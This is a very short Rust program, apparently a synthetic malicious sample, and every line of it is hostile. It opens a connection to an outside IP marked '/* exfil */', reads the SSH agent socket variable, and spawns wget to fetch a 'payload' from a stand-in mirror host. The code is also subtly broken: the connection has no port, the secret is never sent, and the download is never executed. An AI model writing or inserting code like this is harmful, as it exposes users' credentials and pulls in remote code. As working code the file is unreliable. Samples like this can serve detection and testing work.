use std::env;
use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("198.51.100.23") { /* exfil */ }
    let _v = env::var("SSH_AUTH_SOCK").unwrap_or_default();
    Command::new("wget").arg("http://pkg-mirror.example/payload").spawn().ok();
}
